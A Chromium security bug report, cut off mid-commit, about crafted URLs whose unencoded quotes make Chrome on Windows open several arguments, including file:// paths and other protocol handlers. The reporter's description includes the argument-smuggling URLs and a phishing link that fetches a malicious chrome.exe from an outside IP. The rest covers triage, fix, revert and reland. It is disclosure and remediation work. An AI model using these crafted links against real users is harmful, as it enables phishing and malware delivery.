# Security: Malicious link opens multiple tabs via URI handler 

| Field | Value |
|-------|-------|
| **Issue ID** | [40094180](https://issues.chromium.org/issues/40094180) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Internals>Core |
| **Platforms** | Windows |
| **Reporter** | jp...@gmail.com |
| **Assignee** | je...@google.com |
| **Created** | 2019-03-01 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**

Someone can craft a malicious URL that will trick chrome into opening multiple tabs when the URL is activated. This bug is closely related to <https://bugs.chromium.org/p/chromium/issues/detail?id=933004>. I did mention the bug described below in <https://crbug.com/chromium/933004> but it appears to have been missed.

This bug is present in both Windows and Linux but it appears to only be practically exploitable in Windows as all the Linux applications I've tried URL Encode links before passing them to chrome.

The issue occurs when a URL is activated via OS Integration without double quotes being URL encoded. This occurs in the hash segment of several popular windows applications (MS Office, Edge, IE). The invoker string can be found in the registry key 'ChromeHTML\shell\open\command' and has the value:

"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" -- "%1"

When unencoded double quotes are substituted into the %1 section of the command, Chrome will open multiple URLs e.g.

"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" -- "<http://1>" "<http://2>"

**REPRODUCTION CASE**

Ensure chrome is the default handler for the https protocol. Click a malicious URI in a third party application (tested in outlook) with the value:

<https://www.google.com#>" "<https://www.tsscyber.com.au>" "file://c:\windows\system32\drivers\etc\hosts" "feed://test

Instead of clicking the link in a third party application, you can observe the same behaviour by pasting the URL above into the windows run prompt (windows key + r).

Actual: Chrome opens with four tabs; '<https://www.google.com#>', '<https://www.tsscyber.com.au>', 'file://c:\windows\system32\drivers\etc\hosts' and a tab prompting to open a 'feed' URL in the default 'feed' URI handler (or if the user has selected to always open 'feed' URIs, the associated handler will open automatically).

Expected: Chrome opens one tabs with the URI '[https://www.google.com/#%22%20%22https://www.tsscyber.com.au%22%20%22file://c:\\windows\\system32\\drivers\\etc\\hosts%22%20%22feed://test](https://www.google.com/#%22%20%22https://www.tsscyber.com.au%22%20%22file://c:%5C%5Cwindows%5C%5Csystem32%5C%5Cdrivers%5C%5Cetc%5C%5Chosts%22%20%22feed://test)'.

**VERSION**

Chrome Version: Version 72.0.3626.109 (Official Build) (64-bit)  

Operating System: OS Name: Microsoft Windows 10 Enterprise. OS Version: 10.0.17134 N/A Build 17134

**CREDIT INFORMATION**

Reporter credit: Joshua Graham of TSS

## Attachments

- [OrderOfOperations.png](attachments/OrderOfOperations.png) (image/png, 2.2 MB)

## Timeline

### rs...@chromium.org (2019-03-02)

grt: Can you take a look at this, based on https://crbug.com/chromium/933004?

Reporter: what is the risk/attack scenario here? Multiple tabs could be opened by just launching chrome.exe multiple times with different URLs.

[Monorail components: Internals>Core]

### sh...@chromium.org (2019-03-02)

[Empty comment from Monorail migration]

### jp...@gmail.com (2019-03-03)

The attack scenario is similar to an open redirect except that the redirect isn't caused by the behaviour of a website, it's caused by the misinterpretation of the URI by chrome. As such the risk is that users may be more likely to click a malicious link as the link appears to be pointing to a trustworthy domain.

One way in which this issue differs from an open redirect is that it can jump to the file protocol which isn't possible in a redirect. One side-effect of file URIs is that it doesn't block blacklisted files (see https://crbug.com/chromium/937292). Additionally, multiple tabs can be opened at once. Consider the following attack scenario:

1. A user receives a phishing email that convinces them they need to download and install google chrome (or some other trustworthy application). The following link appears in the email:

https://www.google.com/chrome/thank-you.html?statcb=0&installdataindex=empty#" "file://34.217.63.70/chrome.exe

2. Since the link appears to be from the official google domain, the user clicks the link and sees the "Thank you for downloading Chrome!" page load in chrome.

3. Since google interprets the link as two URIs, a second tab opens (but isn't focused) and requests a blacklisted executable over SMB (port 445)/Webdav (port 80). Chrome downloads the blacklisted 'chrome.exe' and closes the second tab.

4. From the user's perspective, they click a link to a legitimate domain, see the legitimate domain's page load along with a 'chrome.exe' file being downloaded. It is likely to look like the malicious 'chrome.exe' was downloaded from the official google domain increasing the likelihood that they would execute it.

I hope this helps.



### gr...@chromium.org (2019-03-03)

Someone on Chrome Security should look at this and decide how to proceed. If I understand correctly, the problem is that an untrusted source can cause Chrome to be invoked by the Windows shell with a single command line argument containing double quotes. When this is substituted by the Windows shell into the command line that Chrome stuffs into the registry (...\chrome.exe -- "%1"), Chrome is invoked with a command line that appears to have multiple quoted arguments rather than one argument containing multiple quotes.

If we decide that this is really a bad thing that we need to fix, we could:

- Change how arguments after the switch terminator ("--") are parsed. Rather than using the standard parsing strategy of CommandLineToArgvW (https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-commandlinetoargvw), we could consider everything to be a single arg with at most one pair of double quotes around it.

- Introduce a new strategy for generating these command lines so that a single argument can be unambiguously parsed. For example, we could put something like this in the registry as the command line:

  ...\chrome.exe --before-arg "%1" --after-arg

  and then carefully remove " --before-arg \"" and "\" --after-arg" from the beginning and ending of the command line and interpret the pulp betwixt them as a single URL argument.

Just some ideas off the top of my head. I kinda prefer the latter since it's very explicit. Any command line that begins with --before-arg and doesn't appear to comply with the required format can be considered a risky untrusted input and dropped.

[Monorail components: Security]

### rs...@chromium.org (2019-03-03)

[Empty comment from Monorail migration]

### jp...@gmail.com (2019-03-04)

Firefox solved it by using only allowing one argument when chrome is invoked by the windows shell. See https://bugzilla.mozilla.org/show_bug.cgi?id=384384 for some information.



### wf...@chromium.org (2019-03-04)

I think opening multiple tabs at once from e.g. a batch file or script might be a use-case we want to support.

Something we might be less willing to support is opening multiple tabs from a shellex, so perhaps only allowing one argument from shell might be the way forward here, perhaps by a special command argument that indicates it's from the shell?

I think given all the right security indicators are presented here, this would be Low, but still worth fixing.

### sh...@chromium.org (2019-03-05)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-04-29)

Bruce, could you please take a look?

### br...@chromium.org (2019-04-29)

What is the desired change? Having a special command argument in the registry for invocations from the shell?

### gr...@chromium.org (2019-05-03)

I think so, yes. ShellUtil::GetChromeShellOpenCmd creates the command line with a quoted %1 in it. It's used in a few places, so we'd want to be sure that all of them should have a new unambiguous format. Then we'd need some new validation in the code that parses command lines for these single-url shell-based launches.

### jp...@gmail.com (2019-06-04)

I just got a notification that https://crbug.com/chromium/933004 is now public. since all the details of this issue are also contained in https://crbug.com/chromium/933004 should it stay private until this is fixed?

### wf...@chromium.org (2019-06-04)

Given this bug severities here are Low, and we often open up Low priority bugs for the greater Chromium community to fix, I'm not too worried about the details leaking out in https://crbug.com/chromium/933004. Nevertheless, out of an abundance of caution, I've deleted the comment where you refer to this bug. Perhaps we can open this one up for community contributions if it's going to remain in queue for a while? Bruce?

### br...@chromium.org (2019-06-04)

I have somebody who could take this on in three weeks, if that is okay, or we could shuffle some things around to do it earlier.

### sh...@chromium.org (2019-09-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-12-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-02-05)

[Empty comment from Monorail migration]

### da...@chromium.org (2020-03-09)

[Empty comment from Monorail migration]

### je...@google.com (2020-03-11)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-09)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-20)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-05-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/452f8315641a0aa502460e7fdc1752edcd6a73c8

commit 452f8315641a0aa502460e7fdc1752edcd6a73c8
Author: Jesse McKenna <jessemckenna@google.com>
Date: Fri May 29 23:06:56 2020

Limit Windows-shell-based launches to one argument

This change adds "--single-argument" to launches done via the Windows
shell, which makes Chrome treat all text after "--single-argument=" as
Chrome's one and only argument. This limits shell-based launches to
passing only one argument to Chrome.

Previously, Chrome's command line as registered with the Windows shell
was `chrome.exe "%1"`, %1 being Windows' filename placeholder. The
shell replaces this placeholder with the file/URL that Chrome has been
invoked on (e.g., if the link "https://www.chromium.org" were clicked,
Chrome would be run with command line
`chrome.exe "https://www.chromium.org"`.

With this change, Chrome's command line is
`chrome.exe --single-argument=%1`, and the contents of %1 are treated
as a single argument regardless of quotes or spacing.

Code that creates the command line string for the Windows shell (e.g.
code writing Chrome's command line to the registry) must use the new
format by calling GetCommandLineStringForShell(), which appends
"--single-argument=%1" to the returned string.

Bug: 937179
Change-Id: I6c0d6f0abce7a8c9f65ca8b90d15438310db7c92
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2116596
Commit-Queue: Jesse McKenna <jessemckenna@google.com>
Reviewed-by: Lei Zhang <thestig@chromium.org>
Reviewed-by: Greg Thompson <grt@chromium.org>
Cr-Commit-Position: refs/heads/master@{#773398}

[modify] https://crrev.com/452f8315641a0aa502460e7fdc1752edcd6a73c8/base/command_line.cc
[modify] https://crrev.com/452f8315641a0aa502460e7fdc1752edcd6a73c8/base/command_line.h
[modify] https://crrev.com/452f8315641a0aa502460e7fdc1752edcd6a73c8/base/command_line_unittest.cc
[modify] https://crrev.com/452f8315641a0aa502460e7fdc1752edcd6a73c8/chrome/browser/web_applications/components/web_app_file_handler_registration_win.cc
[modify] https://crrev.com/452f8315641a0aa502460e7fdc1752edcd6a73c8/chrome/installer/util/shell_util.cc
[modify] https://crrev.com/452f8315641a0aa502460e7fdc1752edcd6a73c8/chrome/installer/util/shell_util.h
[modify] https://crrev.com/452f8315641a0aa502460e7fdc1752edcd6a73c8/chrome/installer/util/shell_util_unittest.cc


### je...@google.com (2020-06-01)

The new command-line syntax that addresses this is active on the latest Canary. I tested it today by running the following command in Windows' Run dialog box, with Canary as my default browser:

https://www.chromium.org#" "https://bugs.chromium.org

Under the old behavior (currently on Stable), this would have resulted in two separate tabs. With the above change, it results in a single window with its URL properly encoded as "https://www.chromium.org/#%22%20%22https://bugs.chromium.org".

### [Deleted User] (2020-06-02)

[Empty comment from Monorail migration]

### na...@google.com (2020-06-08)

[Empty comment from Monorail migration]

### er...@microsoft.com (2020-06-08)

Quick question about the CL in #23: Over in Microsoft Edge, we had a bunch of Canary users complain that attempting to launch URLs from outside of the browser was failing to navigate the tab to the target -- they'd just get a window with a new tab page.

In looking at the behavior of the change, it *looks* like the installer's code that writes to the registry runs when the update is *installed* and takes immediate effect (e.g. subsequent shell invocations immediately begin using the new command line argument). However, until the browser is restarted, the browser code doesn't know what to do with the new command line argument, and hence it ignores the URL. So users will be in a semi-broken state until they restart all of their browser instances.

Is this problem unique to Edge, or will Chrome users encounter the same issue?

(In the attached screenshot, I had annotated the registry key with a dummy value, then visited the version update page. You can see that, without restarting the browser, the setup.exe program from the background updater has re-written the registry).

### er...@microsoft.com (2020-06-09)

I confirmed that the problem observed in #27 reproduces in Chrome and I've filed https://crbug.com/chromium/1092913 to track the regression.

### na...@google.com (2020-06-11)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-06-11)

Congrats! The Panel decided to award $500 for this report! 

### na...@google.com (2020-06-11)

[Empty comment from Monorail migration]

### er...@microsoft.com (2020-06-22)

The fix here was reverted, so I believe this bug should be reactivated.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-06-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2538167d3945fcf80201e8e4ec480d365fba4a02

commit 2538167d3945fcf80201e8e4ec480d365fba4a02
Author: Jesse McKenna <jessemckenna@google.com>
Date: Sat Jun 20 04:47:45 2020

Revert "Limit Windows-shell-based launches to one argument" and "Replace --single-argument= with --single-argument"

This reverts commits 452f8315641a0aa502460e7fdc1752edcd6a73c8
and 74ae85ac6ec12a198c9cf78b71b2e6328a543084.

Reason for revert: this CL and crrev.com/c/2238270, which introduced
the --single-argument flag to the Windows command line, have caused
issues (crbug.com/1092913, crbug.com/1096004, and crbug.com/1096964)
related to incompatibility between the Chrome command line in the
registry and that expected by the running browser. crrev.com/c/2238270
was an attempt to fix those issues, but outstanding bug
crbug.com/1096964 is still not well-understood and has made it to the
Dev channel. This change reverts both CLs to prevent further issues
and to enable a future reland that incorporates lessons learned.
Reverting both CLs simultaneously is necessary to prevent trybot
failures due to the same registry-browser command-line incompatibility
issues (i.e., browser-test trybots having the current command-line
syntax "chrome.exe --single-argument %1" in their registry, and
failing to recognize the argument in the between-changes syntax
"chrome.exe --single-argument=%1").

Original change's description:
> Limit Windows-shell-based launches to one argument
>
> This change adds "--single-argument" to launches done via the Windows
> shell, which makes Chrome treat all text after "--single-argument=" as
> Chrome's one and only argument. This limits shell-based launches to
> passing only one argument to Chrome.
>
> Previously, Chrome's command line as registered with the Windows shell
> was `chrome.exe "%1"`, %1 being Windows' filename placeholder. The
> shell replaces this placeholder with the file/URL that Chrome has been
> invoked on (e.g., if the link "https://www.chromium.org" were clicked,
> Chrome would be run with command line
> `chrome.exe "https://www.chromium.org"`.
>
> With this change, Chrome's command line is
> `chrome.exe --single-argument=%1`, and the contents of %1 are treated
> as a single argument regardless of quotes or spacing.
>
> Code that creates the command line string for the Windows shell (e.g.
> code writing Chrome's command line to the registry) must use the new
> format by calling GetCommandLineStringForShell(), which appends
> "--single-argument=%1" to the returned string.
>
> Bug: 937179
> Change-Id: I6c0d6f0abce7a8c9f65ca8b90d15438310db7c92
> Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2116596
> Commit-Queue: Jesse McKenna <jessemckenna@google.com>
> Reviewed-by: Lei Zhang <thestig@chromium.org>
> Reviewed-by: Greg Thompson <grt@chromium.org>
> Cr-Commit-Position: refs/heads/master@{#773398}

TBR=thestig@chromium.org,grt@chromium.org,jessemckenna@google.com

# Not skipping CQ checks because original CL landed > 1 day ago.

Bug: 937179
Change-Id: I014cd0b1acb5080b16b68268ea8d20eb18f9b431
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2255138
Commit-Queue: Jesse McKenna <jessemckenna@google.com>
Reviewed-by: Jesse McKenna <jessemckenna@google.com>
Cr-Commit-Position: refs/heads/master@{#780559}

[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/base/command_line.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/base/command_line.h
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/base/command_line_unittest.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/browser/web_applications/components/web_app_file_handler_registration_win.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/installer/util/shell_util.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/installer/util/shell_util.h
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/installer/util/shell_util_unittest.cc


### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-06-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2538167d3945fcf80201e8e4ec480d365fba4a02

commit 2538167d3945fcf80201e8e4ec480d365fba4a02
Author: Jesse McKenna <jessemckenna@google.com>
Date: Sat Jun 20 04:47:45 2020

Revert "Limit Windows-shell-based launches to one argument" and "Replace --single-argument= with --single-argument"

This reverts commits 452f8315641a0aa502460e7fdc1752edcd6a73c8
and 74ae85ac6ec12a198c9cf78b71b2e6328a543084.

Reason for revert: this CL and crrev.com/c/2238270, which introduced
the --single-argument flag to the Windows command line, have caused
issues (crbug.com/1092913, crbug.com/1096004, and crbug.com/1096964)
related to incompatibility between the Chrome command line in the
registry and that expected by the running browser. crrev.com/c/2238270
was an attempt to fix those issues, but outstanding bug
crbug.com/1096964 is still not well-understood and has made it to the
Dev channel. This change reverts both CLs to prevent further issues
and to enable a future reland that incorporates lessons learned.
Reverting both CLs simultaneously is necessary to prevent trybot
failures due to the same registry-browser command-line incompatibility
issues (i.e., browser-test trybots having the current command-line
syntax "chrome.exe --single-argument %1" in their registry, and
failing to recognize the argument in the between-changes syntax
"chrome.exe --single-argument=%1").

Original change's description:
> Limit Windows-shell-based launches to one argument
>
> This change adds "--single-argument" to launches done via the Windows
> shell, which makes Chrome treat all text after "--single-argument=" as
> Chrome's one and only argument. This limits shell-based launches to
> passing only one argument to Chrome.
>
> Previously, Chrome's command line as registered with the Windows shell
> was `chrome.exe "%1"`, %1 being Windows' filename placeholder. The
> shell replaces this placeholder with the file/URL that Chrome has been
> invoked on (e.g., if the link "https://www.chromium.org" were clicked,
> Chrome would be run with command line
> `chrome.exe "https://www.chromium.org"`.
>
> With this change, Chrome's command line is
> `chrome.exe --single-argument=%1`, and the contents of %1 are treated
> as a single argument regardless of quotes or spacing.
>
> Code that creates the command line string for the Windows shell (e.g.
> code writing Chrome's command line to the registry) must use the new
> format by calling GetCommandLineStringForShell(), which appends
> "--single-argument=%1" to the returned string.
>
> Bug: 937179
> Change-Id: I6c0d6f0abce7a8c9f65ca8b90d15438310db7c92
> Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2116596
> Commit-Queue: Jesse McKenna <jessemckenna@google.com>
> Reviewed-by: Lei Zhang <thestig@chromium.org>
> Reviewed-by: Greg Thompson <grt@chromium.org>
> Cr-Commit-Position: refs/heads/master@{#773398}

TBR=thestig@chromium.org,grt@chromium.org,jessemckenna@google.com

# Not skipping CQ checks because original CL landed > 1 day ago.

Bug: 937179
Change-Id: I014cd0b1acb5080b16b68268ea8d20eb18f9b431
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2255138
Commit-Queue: Jesse McKenna <jessemckenna@google.com>
Reviewed-by: Jesse McKenna <jessemckenna@google.com>
Cr-Commit-Position: refs/heads/master@{#780559}

[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/base/command_line.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/base/command_line.h
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/base/command_line_unittest.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/browser/web_applications/components/web_app_file_handler_registration_win.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/installer/util/shell_util.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/installer/util/shell_util.h
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/installer/util/shell_util_unittest.cc


### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-06-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2538167d3945fcf80201e8e4ec480d365fba4a02

commit 2538167d3945fcf80201e8e4ec480d365fba4a02
Author: Jesse McKenna <jessemckenna@google.com>
Date: Sat Jun 20 04:47:45 2020

Revert "Limit Windows-shell-based launches to one argument" and "Replace --single-argument= with --single-argument"

This reverts commits 452f8315641a0aa502460e7fdc1752edcd6a73c8
and 74ae85ac6ec12a198c9cf78b71b2e6328a543084.

Reason for revert: this CL and crrev.com/c/2238270, which introduced
the --single-argument flag to the Windows command line, have caused
issues (crbug.com/1092913, crbug.com/1096004, and crbug.com/1096964)
related to incompatibility between the Chrome command line in the
registry and that expected by the running browser. crrev.com/c/2238270
was an attempt to fix those issues, but outstanding bug
crbug.com/1096964 is still not well-understood and has made it to the
Dev channel. This change reverts both CLs to prevent further issues
and to enable a future reland that incorporates lessons learned.
Reverting both CLs simultaneously is necessary to prevent trybot
failures due to the same registry-browser command-line incompatibility
issues (i.e., browser-test trybots having the current command-line
syntax "chrome.exe --single-argument %1" in their registry, and
failing to recognize the argument in the between-changes syntax
"chrome.exe --single-argument=%1").

Original change's description:
> Limit Windows-shell-based launches to one argument
>
> This change adds "--single-argument" to launches done via the Windows
> shell, which makes Chrome treat all text after "--single-argument=" as
> Chrome's one and only argument. This limits shell-based launches to
> passing only one argument to Chrome.
>
> Previously, Chrome's command line as registered with the Windows shell
> was `chrome.exe "%1"`, %1 being Windows' filename placeholder. The
> shell replaces this placeholder with the file/URL that Chrome has been
> invoked on (e.g., if the link "https://www.chromium.org" were clicked,
> Chrome would be run with command line
> `chrome.exe "https://www.chromium.org"`.
>
> With this change, Chrome's command line is
> `chrome.exe --single-argument=%1`, and the contents of %1 are treated
> as a single argument regardless of quotes or spacing.
>
> Code that creates the command line string for the Windows shell (e.g.
> code writing Chrome's command line to the registry) must use the new
> format by calling GetCommandLineStringForShell(), which appends
> "--single-argument=%1" to the returned string.
>
> Bug: 937179
> Change-Id: I6c0d6f0abce7a8c9f65ca8b90d15438310db7c92
> Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2116596
> Commit-Queue: Jesse McKenna <jessemckenna@google.com>
> Reviewed-by: Lei Zhang <thestig@chromium.org>
> Reviewed-by: Greg Thompson <grt@chromium.org>
> Cr-Commit-Position: refs/heads/master@{#773398}

TBR=thestig@chromium.org,grt@chromium.org,jessemckenna@google.com

# Not skipping CQ checks because original CL landed > 1 day ago.

Bug: 937179
Change-Id: I014cd0b1acb5080b16b68268ea8d20eb18f9b431
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2255138
Commit-Queue: Jesse McKenna <jessemckenna@google.com>
Reviewed-by: Jesse McKenna <jessemckenna@google.com>
Cr-Commit-Position: refs/heads/master@{#780559}

[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/base/command_line.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/base/command_line.h
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/base/command_line_unittest.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/browser/web_applications/components/web_app_file_handler_registration_win.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/installer/util/shell_util.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/installer/util/shell_util.h
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/installer/util/shell_util_unittest.cc


### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-06-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2538167d3945fcf80201e8e4ec480d365fba4a02

commit 2538167d3945fcf80201e8e4ec480d365fba4a02
Author: Jesse McKenna <jessemckenna@google.com>
Date: Sat Jun 20 04:47:45 2020

Revert "Limit Windows-shell-based launches to one argument" and "Replace --single-argument= with --single-argument"

This reverts commits 452f8315641a0aa502460e7fdc1752edcd6a73c8
and 74ae85ac6ec12a198c9cf78b71b2e6328a543084.

Reason for revert: this CL and crrev.com/c/2238270, which introduced
the --single-argument flag to the Windows command line, have caused
issues (crbug.com/1092913, crbug.com/1096004, and crbug.com/1096964)
related to incompatibility between the Chrome command line in the
registry and that expected by the running browser. crrev.com/c/2238270
was an attempt to fix those issues, but outstanding bug
crbug.com/1096964 is still not well-understood and has made it to the
Dev channel. This change reverts both CLs to prevent further issues
and to enable a future reland that incorporates lessons learned.
Reverting both CLs simultaneously is necessary to prevent trybot
failures due to the same registry-browser command-line incompatibility
issues (i.e., browser-test trybots having the current command-line
syntax "chrome.exe --single-argument %1" in their registry, and
failing to recognize the argument in the between-changes syntax
"chrome.exe --single-argument=%1").

Original change's description:
> Limit Windows-shell-based launches to one argument
>
> This change adds "--single-argument" to launches done via the Windows
> shell, which makes Chrome treat all text after "--single-argument=" as
> Chrome's one and only argument. This limits shell-based launches to
> passing only one argument to Chrome.
>
> Previously, Chrome's command line as registered with the Windows shell
> was `chrome.exe "%1"`, %1 being Windows' filename placeholder. The
> shell replaces this placeholder with the file/URL that Chrome has been
> invoked on (e.g., if the link "https://www.chromium.org" were clicked,
> Chrome would be run with command line
> `chrome.exe "https://www.chromium.org"`.
>
> With this change, Chrome's command line is
> `chrome.exe --single-argument=%1`, and the contents of %1 are treated
> as a single argument regardless of quotes or spacing.
>
> Code that creates the command line string for the Windows shell (e.g.
> code writing Chrome's command line to the registry) must use the new
> format by calling GetCommandLineStringForShell(), which appends
> "--single-argument=%1" to the returned string.
>
> Bug: 937179
> Change-Id: I6c0d6f0abce7a8c9f65ca8b90d15438310db7c92
> Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2116596
> Commit-Queue: Jesse McKenna <jessemckenna@google.com>
> Reviewed-by: Lei Zhang <thestig@chromium.org>
> Reviewed-by: Greg Thompson <grt@chromium.org>
> Cr-Commit-Position: refs/heads/master@{#773398}

TBR=thestig@chromium.org,grt@chromium.org,jessemckenna@google.com

# Not skipping CQ checks because original CL landed > 1 day ago.

Bug: 937179
Change-Id: I014cd0b1acb5080b16b68268ea8d20eb18f9b431
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2255138
Commit-Queue: Jesse McKenna <jessemckenna@google.com>
Reviewed-by: Jesse McKenna <jessemckenna@google.com>
Cr-Commit-Position: refs/heads/master@{#780559}

[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/base/command_line.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/base/command_line.h
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/base/command_line_unittest.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/browser/web_applications/components/web_app_file_handler_registration_win.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/installer/util/shell_util.cc
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/installer/util/shell_util.h
[modify] https://crrev.com/2538167d3945fcf80201e8e4ec480d365fba4a02/chrome/installer/util/shell_util_unittest.cc


### jp...@gmail.com (2020-06-29)

Hi team, 

Can the bounty for this one be donated to OneGirl Australia (https://www.onegirl.org.au/)?

### me...@chromium.org (2020-07-06)

jessemckenna@, just wanted to briefly check the status here because of the latest reverts. Can we now consider this fixed? Thanks.

### je...@google.com (2020-07-06)

meacer@: the fix was indeed reverted (just one revert CL that bugdroid posted multiple times on this bug due to some hiccup), so it is currently not fixed, but a reland is in progress. Feel free to track its progress at crrev.com/c/2273598 if interested.

### [Deleted User] (2020-07-16)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-07-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/036150cfca14e4f91b7f06855b19462575aed37f

commit 036150cfca14e4f91b7f06855b19462575aed37f
Author: Jesse McKenna <jessemckenna@google.com>
Date: Fri Jul 17 21:11:17 2020

Reland "Limit Windows-shell-based launches to one argument" and "Replace --single-argument= with --single-argument"

This reverts commit 2538167d3945fcf80201e8e4ec480d365fba4a02.

Reason for revert: This relands the two reverted CLs.

The original change to the command-line syntax (landed in two separate
CLs) caused the following issues:
* Temporary breakage after background update from `chrome.exe %1`
  syntax to `chrome.exe --single-argument=%1` (crbug.com/1092913),
  when a file is opened via the shell:
  * Registry contains `--single-argument=%1`, running browser sees no
    argument (only an unrecognized switch), opens new tab page
* Crashes after attempted fix that replaced `--single-argument=%1`
  with `--single-argument %1` due to a CHECK in the first change
  enforcing the presence of the `=` character:
  * After background update, registry contains `--single-argument %1`,
    running browser CHECKs for `=` and crashes (crbug.com/1096004)
  * Windows 7 Dev channel (expecting `=`) default-browser check parses
    Canary's registry command line (containing ` `) to get the default
    browser path (crbug.com/1096964), triggering CHECK
  * Crash when unregistering PWA file handlers on local Chromium build
    (crbug.com/1096004#c3), presumed to be caused by parsing the
    shell/open command written by file-handler registration on an
    older version (as local Chromium builds don't background update)

What all the above issues have in common is that they are caused by
incompatibility between new and old versions. With this in mind, this
reland assumes that the old and new syntax can and will be mixed in
potentially unexpected ways.

This change replaces `chrome.exe %1` with
`chrome.exe --single-argument %1`, which is flexible enough to handle
the following cases:
* If registry contains old syntax and running browser expects new
  syntax:
  * Due to the absence of the `--single-argument` switch, the command
    line will be parsed normally (potentially as multiple arguments)
* If registry contains new syntax and running browser expects old
  syntax:
  * The browser will ignore the unrecognized `--single-argument`
    switch and parse the command line normally (as the argument still
    appears after a space like in the current syntax)
* If browser parses command line from another channel with different
  syntax:
  * Covered by either the first or second case above

This reland also replaces the single remaining CHECK with a DCHECK.

Original change's description:
> Revert "Limit Windows-shell-based launches to one argument" and "Replace --single-argument= with --single-argument"
>
> This reverts commits 452f8315641a0aa502460e7fdc1752edcd6a73c8
> and 74ae85ac6ec12a198c9cf78b71b2e6328a543084.
>
> Reason for revert: this CL and crrev.com/c/2238270, which introduced
> the --single-argument flag to the Windows command line, have caused
> issues (crbug.com/1092913, crbug.com/1096004, and crbug.com/1096964)
> related to incompatibility between the Chrome command line in the
> registry and that expected by the running browser. crrev.com/c/2238270
> was an attempt to fix those issues, but outstanding bug
> crbug.com/1096964 is still not well-understood and has made it to the
> Dev channel. This change reverts both CLs to prevent further issues
> and to enable a future reland that incorporates lessons learned.
> Reverting both CLs simultaneously is necessary to prevent trybot
> failures due to the same registry-browser command-line incompatibility
> issues (i.e., browser-test trybots having the current command-line
> syntax "chrome.exe --single-argument %1" in their registry, and
> failing to recognize the argument in the between-changes syntax
> "chrome.exe --single-argument=%1").
>
> Original change's description:
> > Limit Windows-shell-based launches to one argument
> >
> > This change adds "--single-argument" to launches done via the Windows
> > shell, which makes Chrome treat all text after "--single-argument=" as
